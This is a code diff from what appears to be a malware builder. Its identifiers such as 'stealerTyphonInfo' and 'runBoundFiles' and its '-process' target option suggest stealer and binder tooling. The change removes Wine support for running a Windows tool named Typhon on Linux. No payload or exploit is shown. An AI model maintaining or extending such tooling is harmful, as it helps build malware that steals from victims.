@@ -122,33 +122,16 @@ function isPEFile(filePath: string): boolean {
   }
 }
 
-async function isWineAvailable(): Promise<{ bin: string } | false> {
-  for (const bin of ["wine64", "wine"]) {
-    try {
-      const result = await $`${bin} --version`.quiet().nothrow();
-      if (result.exitCode === 0) return { bin };
-    } catch {}
-  }
-  return false;
-}
-
 async function checkTyphonAvailable(sendToStream: (data: any) => void): Promise<TyphonInfo | null> {
   const toolsDir = path.join(ensureDataDir(), "tools");
 
-  // Helper: resolve a found binary, checking Wine requirement on Linux
+  // Helper: resolve a found binary
   const resolve = async (binPath: string, label: string): Promise<TyphonInfo | null> => {
-    if (process.platform !== "linux") {
-      sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
-      return { bin: binPath, useWine: false };
-    }
     if (isPEFile(binPath)) {
-      const wine = await isWineAvailable();
-      if (wine) {
-        sendToStream({ type: "output", text: `Typhon found: ${label} (via ${wine.bin})\n`, level: "info" });
-        return { bin: binPath, useWine: true, wineBin: wine.bin };
+      if (process.platform === "linux") {
+        sendToStream({ type: "output", text: `WARNING: ${label} is a Windows PE and cannot run natively on Linux without Wine (which is disabled for image size).\n`, level: "warn" });
+        return null;
       }
-      sendToStream({ type: "output", text: `WARNING: ${label} is a Windows PE but Wine is not installed\n`, level: "warn" });
-      return null;
     }
     sendToStream({ type: "output", text: `Typhon found: ${label}\n`, level: "info" });
     return { bin: binPath, useWine: false };
@@ -1586,13 +1569,7 @@ func runBoundFiles() {
           }
 
           try {
-            let typhonResult;
-            if (typhonInfo.useWine) {
-              const wb = typhonInfo.wineBin || "wine64";
-              typhonResult = await $`${wb} ${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
-            } else {
-              typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
-            }
+            const typhonResult = await $`${typhonInfo.bin} ${typhonArgs}`.nothrow().quiet();
 
             if (typhonResult.exitCode !== 0) {
               const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
@@ -1977,9 +1954,7 @@ func runBoundFiles() {
           if (config.typhonProcess) typhonArgs.push("-process", config.typhonProcess);
 
           try {
-            const typhonResult = stealerTyphonInfo.useWine
-              ? await $`${stealerTyphonInfo.wineBin || "wine64"} ${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet()
-              : await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
+            const typhonResult = await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
 
             if (typhonResult.exitCode !== 0) {
               const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
